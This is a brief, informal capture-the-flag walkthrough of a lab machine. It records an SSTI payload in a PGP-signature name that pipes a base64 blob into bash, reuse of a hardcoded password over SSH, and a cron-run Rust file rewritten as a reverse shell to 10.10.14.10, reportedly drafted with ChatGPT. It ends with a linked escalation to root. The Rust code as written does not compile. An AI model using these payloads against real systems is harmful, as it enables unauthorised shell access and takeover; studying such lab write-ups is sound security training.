on the main site there was a function that validates the ==pgp sigin== and the public key ..

we need to create ==pgp key== and validate it and we can get shell via ==ssti==

```
gpg --gen-key
gpg -a -o pub.key --export hacker
cat pub.key
echo 'life time' | gpg --clear-sign
we paste both the keys and it showed some error double quoting the name we used to make the key

so we did
{{ namespace.__init__.__globals__.os.popen('echo /... | base64 -d | bash ').read() }}
and got shell
```

in .config in home dir the password for other user was hardcoded we used it to ssh

and got user,txt

now ==pspy== told in /opt/tipnet a ==rs file== was on cron so we edited it using chat gpt

```
use std::process::Command;

fn main() {
    // Execute the 'bash' command
    let output = Command::new("bash")
        .arg("-c")
        .arg("bash -i >& /dev/tcp/10.10.14.10/5555 0>&1")
        .expect("Failed to execute bash command");
```

and got shell as ash now for the ==jail break ==

we used `https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25`

and got shell as root
